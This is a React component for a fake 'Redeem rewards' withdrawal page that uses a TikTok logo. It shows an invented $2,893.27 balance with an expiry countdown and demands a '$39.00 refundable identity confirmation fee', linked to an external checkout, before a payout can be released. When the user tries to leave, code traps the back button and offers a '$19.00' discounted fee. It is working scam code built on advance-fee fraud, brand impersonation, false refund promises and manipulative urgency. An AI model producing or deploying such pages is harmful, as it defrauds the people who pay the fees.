import { useState, useEffect } from "react";
import { useUtmNavigate, useUtmHref } from "@/hooks/use-utm";

const BALANCE = "2,893.27";
const AMOUNT_OPTIONS = [
  { label: "$1.50", value: 1.50 },
  { label: "$5", value: 5 },
  { label: "$10", value: 10 },
];

const Withdraw = () => {
  const navigate = useUtmNavigate();
  const checkoutHref = useUtmHref("https://checkout.vendepay.com/a7138011-a3bc-433f-a231-c0289818bd8e");
  const discountHref = useUtmHref("https://checkout.vendepay.com/fe582439-12bb-40b4-b735-df413388201f");
  const [timeLeft, setTimeLeft] = useState({ h: 0, m: 16, s: 38 });
  const [pixName, setPixName] = useState("");
  const [pixKeyType, setPixKeyType] = useState("");
  const [pixKey, setPixKey] = useState("");
  const [selectedAmount, setSelectedAmount] = useState(2893.27);
  const [showAccountType, setShowAccountType] = useState(false);
  const [selectedAccount, setSelectedAccount] = useState("");
  const [showConfirmation, setShowConfirmation] = useState(false);
  const [showDiscountPopup, setShowDiscountPopup] = useState(false);

  useEffect(() => {
    const timer = setInterval(() => {
      setTimeLeft((prev) => {
        let { h, m, s } = prev;
        if (s > 0) s--;
        else if (m > 0) { m--; s = 59; }
        else if (h > 0) { h--; m = 59; s = 59; }
        return { h, m, s };
      });
    }, 1000);
    return () => clearInterval(timer);
  }, []);

  // Intercept back button when confirmation modal is open
  useEffect(() => {
    if (showConfirmation) {
      window.history.pushState(null, "", window.location.href);
      const handlePopState = () => {
        setShowConfirmation(false);
        setShowDiscountPopup(true);
        window.history.pushState(null, "", window.location.href);
      };
      window.addEventListener("popstate", handlePopState);
      return () => window.removeEventListener("popstate", handlePopState);
    }
  }, [showConfirmation]);

  const pad = (n: number) => n.toString().padStart(2, "0");

  const handlePixSubmit = () => {
    if (pixName && pixKeyType && pixKey) {
      setShowConfirmation(true);
    }
  };

  return (
    <div className="min-h-screen bg-[#f0f0f0]">
      {/* Expiration Header */}
      <div className="bg-card-foreground text-card text-center py-2.5 text-xs tracking-wider sticky top-0 z-30">
        YOUR BALANCE EXPIRES IN{" "}
        <span className="font-bold">{pad(timeLeft.h)}</span> -{" "}
        <span className="font-bold">{pad(timeLeft.m)}</span> -{" "}
        <span className="font-bold">{pad(timeLeft.s)}</span>
      </div>

      <div className="max-w-xl mx-auto px-4 pt-6 pb-10 space-y-4">
        <h1 className="text-xl font-bold text-card-foreground text-center mb-4">
          Redeem rewards
        </h1>

        {/* Balance Card */}
        <div className="rounded-xl overflow-hidden shadow-sm">
          <div className="bg-gradient-to-r from-[#2d2d2d] to-[#3a3a3a] p-5 flex items-center justify-between">
            <div>
              <div className="text-sm text-white/70">Your balance</div>
              <div className="text-3xl font-black text-white mt-1">$ {BALANCE}</div>
              <div className="text-xs text-white/50 mt-1">= 44,892,700 points</div>
            </div>
            <img src="/images/p-saldo-maior.png" alt="" className="w-16 h-16 object-contain" />
          </div>
          <div className="bg-[#4a4a4a] px-5 py-2 text-xs text-white/70">
            Last reward: $ 646.43
          </div>
        </div>

        {/* Withdraw Section */}
        <div className="bg-card rounded-xl p-5 shadow-sm">
          <h2 className="text-base font-bold text-card-foreground mb-3">Withdraw money</h2>
          <div className="flex items-center gap-2 text-sm text-muted-foreground mb-4">
            <img src="/images/fi-rs-credit-card.png" alt="" className="w-5 h-5" />
            <span>Transfer</span>
          </div>

          <div className="flex gap-2 mb-4">
            {AMOUNT_OPTIONS.map((opt) => (
              <button
                key={opt.label}
                onClick={() => setSelectedAmount(opt.value)}
                className={`flex-1 font-semibold py-2.5 rounded-lg text-sm transition-all ${
                  selectedAmount === opt.value
                    ? "bg-primary text-primary-foreground"
                    : "bg-card-foreground text-card hover:opacity-90"
                }`}
              >
                {opt.label}
              </button>
            ))}
            <button
              onClick={() => setSelectedAmount(2893.27)}
              className={`flex-1 font-semibold py-2.5 rounded-lg text-sm transition-all ${
                selectedAmount === 2893.27
                  ? "bg-primary text-primary-foreground"
                  : "bg-card-foreground text-card hover:opacity-90"
              }`}
            >
              Max
            </button>
          </div>

          <div className="border-2 border-primary rounded-xl py-3 text-center mb-4">
            <span className="text-primary font-bold text-lg">
              $ {selectedAmount.toLocaleString("en-US", { minimumFractionDigits: 2, maximumFractionDigits: 2 })}
            </span>
          </div>

          <button
            onClick={() => setShowAccountType(true)}
            className="w-full bg-primary text-primary-foreground font-semibold py-3 rounded-xl mb-3 hover:opacity-90 transition-opacity"
          >
            Withdraw money
          </button>

          <p className="text-[10px] text-muted-foreground text-center">
            To withdraw money, you need a minimum balance of $1.50. Withdrawal limits for individual and monthly transactions may vary by country or region.
          </p>
        </div>

        {/* Live Coins Section */}
        <div className="bg-card rounded-xl p-5 shadow-sm">
          <div className="flex items-start justify-between">
            <div className="flex-1">
              <h3 className="text-base font-bold text-card-foreground mb-1">Get Coins for LIVE</h3>
              <p className="text-xs text-muted-foreground">
                Use Coins to send virtual gifts to your favorite live hosts.
              </p>
            </div>
            <img src="/images/flor.png" alt="" className="w-14 h-14 object-contain ml-3" />
          </div>
          <button
            disabled
            className="w-full bg-muted text-muted-foreground font-semibold py-2.5 rounded-xl mt-3 opacity-60 cursor-not-allowed"
          >
            Unavailable
          </button>
        </div>

        {/* Mobile Recharge */}
        <div className="bg-card rounded-xl p-5 shadow-sm">
          <h3 className="text-base font-bold text-card-foreground mb-3">Mobile recharge</h3>
          <div className="flex items-center gap-2 mb-3">
            <span className="text-sm text-muted-foreground border-r border-border pr-2">+1</span>
            <span className="text-sm text-muted-foreground">(347) 528-9031</span>
          </div>
          <button
            disabled
            className="w-full bg-muted text-muted-foreground font-semibold py-2.5 rounded-xl mb-3 opacity-60 cursor-not-allowed"
          >
            Unavailable
          </button>
          <p className="text-[10px] text-muted-foreground text-center">
            You need a minimum balance of $10 for mobile recharge
          </p>
        </div>

      </div>

      {/* Account Type Popup */}
      {showAccountType && (
        <div className="fixed inset-0 z-50 bg-foreground/40 backdrop-blur-sm flex items-center justify-center p-4 overflow-y-auto min-h-[100dvh]">
          <div className="bg-card rounded-2xl w-full max-w-sm shadow-2xl overflow-hidden my-auto">
            <div className="py-4 border-b border-border">
              <h3 className="text-base font-bold text-card-foreground text-center">Account Type</h3>
            </div>
            <div className="divide-y divide-border">
              {[
                "Cash App ($Cashtag)",
                "PayPal (Email)",
                "Venmo (Username)",
                "Zelle (Email or Phone)",
                "Wire",
              ].map((option) => (
                <button
                  key={option}
                  onClick={() => {
                    setSelectedAccount(option);
                    setShowAccountType(false);
                    setShowConfirmation(true);
                  }}
                  className="w-full flex items-center justify-between px-5 py-4 hover:bg-muted/50 transition-colors"
                >
                  <span className="text-sm font-medium text-card-foreground">{option}</span>
                  <div className={`w-5 h-5 rounded-full border-2 flex items-center justify-center ${
                    selectedAccount === option ? "border-primary" : "border-muted-foreground/30"
                  }`}>
                    {selectedAccount === option && (
                      <div className="w-2.5 h-2.5 rounded-full bg-primary" />
                    )}
                  </div>
                </button>
              ))}
            </div>
          </div>
        </div>
      )}

      {/* Confirmation Modal */}
      {showConfirmation && (
        <div className="fixed inset-0 z-50 bg-foreground/40 backdrop-blur-sm flex items-center justify-center p-3 sm:p-4 min-h-[100dvh]">
          <div className="bg-card rounded-2xl w-full max-w-md shadow-2xl max-h-[calc(100dvh-1.5rem)] sm:max-h-[calc(100dvh-2rem)] overflow-hidden flex flex-col">
            <div className="flex-1 overflow-y-auto p-5 pb-3 sm:p-6 sm:pb-4">
            <div className="flex justify-center mb-3 sm:mb-4">
              <img src="/images/tiktok-logo.png" alt="TikTok" className="h-8 object-contain" />
            </div>
            <div className="text-center mb-3 sm:mb-4">
              <span className="text-xs text-muted-foreground tracking-wider">AVAILABLE BALANCE</span>
              <div className="text-2xl font-bold text-card-foreground mt-1">$ {BALANCE}</div>
            </div>
            <div className="bg-[#f8f8f8] rounded-xl p-3 sm:p-4 mb-3 sm:mb-4 text-center">
              <span className="text-sm text-muted-foreground">Awaiting withdrawal confirmation</span>
            </div>

            <div className="border border-border rounded-xl p-3 sm:p-4 mb-3 sm:mb-4">
              <h4 className="text-xs font-semibold text-card-foreground tracking-wider mb-2 sm:mb-3">IDENTITY CONFIRMATION</h4>
              <div className="text-center mb-1.5 sm:mb-2">
              <span className="text-2xl font-bold text-primary">$ 39.00</span>
              <div className="text-[10px] text-muted-foreground">REFUNDABLE AMOUNT</div>
              </div>
              <p className="text-xs text-muted-foreground text-center">
                Required fee to release the withdrawal of $ {BALANCE}. The $39.00 amount will be fully refunded to you within 1 minute.
              </p>
            </div>

            <div className="border border-border rounded-xl p-3 sm:p-4 mb-3 sm:mb-4">
              <h4 className="text-xs font-semibold text-card-foreground tracking-wider mb-2 sm:mb-3">REFUND DETAILS</h4>
              <div className="space-y-2 text-sm">
                <div className="flex justify-between">
                  <span className="text-muted-foreground">Name</span>
                  <span className="text-card-foreground font-medium">{pixName}</span>
                </div>
                <div className="flex justify-between">
                  <span className="text-muted-foreground">Account</span>
                  <span className="text-card-foreground font-medium">{pixKey}</span>
                </div>
                <div className="flex justify-between">
                  <span className="text-muted-foreground">Amount to receive</span>
                  <span className="text-card-foreground font-bold">$ {BALANCE}</span>
                </div>
              </div>
            </div>

            <div className="border border-border rounded-xl p-3 sm:p-4 mb-3 sm:mb-4">
              <h4 className="text-xs font-semibold text-card-foreground tracking-wider mb-2 sm:mb-3">RELEASE PROCESS</h4>
              <div className="space-y-2.5 sm:space-y-3">
                <div className="flex items-start gap-3">
                  <div className="w-6 h-6 rounded-full bg-primary text-primary-foreground flex items-center justify-center text-xs font-bold shrink-0">1</div>
                  <div>
                    <p className="text-sm font-medium text-card-foreground">Pay confirmation fee</p>
                    <p className="text-xs text-muted-foreground">$39.00 for identity verification</p>
                  </div>
                </div>
                <div className="flex items-start gap-3">
                  <div className="w-6 h-6 rounded-full bg-[hsl(var(--success))] text-white flex items-center justify-center text-xs font-bold shrink-0">✓</div>
                  <div>
                    <p className="text-sm font-medium text-card-foreground">Receive automatic refund</p>
                    <p className="text-xs text-muted-foreground">Amount returned within 1 minute</p>
                  </div>
                </div>
                <div className="flex items-start gap-3">
                  <div className="w-6 h-6 rounded-full bg-muted text-muted-foreground flex items-center justify-center text-xs font-bold shrink-0">3</div>
                  <div>
                    <p className="text-sm font-medium text-card-foreground">Access full balance</p>
                    <p className="text-xs text-muted-foreground">$ {BALANCE} released for withdrawal</p>
                  </div>
                </div>
              </div>
            </div>

            </div>

            <div className="border-t border-border bg-card p-5 pt-3 sm:p-6 sm:pt-4 shrink-0">
            <a href={checkoutHref} className="block w-full bg-primary text-primary-foreground font-semibold py-3.5 rounded-xl mb-2 hover:opacity-90 transition-opacity text-center">
              Pay fee to Release Withdrawal
            </a>
            <p className="text-xs text-center text-muted-foreground">⏱️ Automatic refund in 1 minute</p>
            </div>

          </div>
        </div>
      )}

      {/* Discount Popup on Back */}
      {showDiscountPopup && (
        <div className="fixed inset-0 z-50 bg-foreground/40 backdrop-blur-sm flex items-center justify-center p-4 overflow-y-auto min-h-[100dvh]">
          <div className="bg-card rounded-2xl p-6 w-full max-w-sm shadow-2xl my-auto">
            <h3 className="text-lg font-extrabold text-card-foreground text-center mb-4">
              ⚠️ ATTENTION: Updated Fee!
            </h3>
            <div className="bg-destructive/10 rounded-xl p-5 mb-4 text-center">
              <span className="text-4xl font-extrabold text-destructive">$ 19.00</span>
              <div className="mt-2">
                <span className="bg-destructive/20 text-destructive text-[10px] font-semibold px-3 py-1 rounded-full tracking-wider">
                  REFUNDABLE AMOUNT
                </span>
              </div>
            </div>

            <div className="text-center mb-4">
              <p className="text-sm font-bold text-card-foreground mb-1">Identity confirmation required</p>
              <p className="text-xs text-muted-foreground">
                To release your withdrawal, identity confirmation is required. The <strong>$19.00</strong> amount will be <strong>automatically refunded</strong> within 1 minute after payment.
              </p>
            </div>

            <div className="space-y-2 mb-5">
              <div className="flex items-center gap-2">
                <span className="text-[hsl(var(--success))] font-bold">✓</span>
                <span className="text-sm text-card-foreground font-medium">Automatic refund in 1 minute</span>
              </div>
              <div className="flex items-center gap-2">
                <span className="text-[hsl(var(--success))] font-bold">✓</span>
                <span className="text-sm text-card-foreground font-medium">Identity confirmation</span>
              </div>
            </div>

            <a href={discountHref} className="block w-full bg-destructive text-destructive-foreground font-semibold py-3.5 rounded-xl hover:opacity-90 transition-opacity text-center">
              Pay fee to Release Withdrawal
            </a>
          </div>
        </div>
      )}
    </div>
  );
};

export default Withdraw;
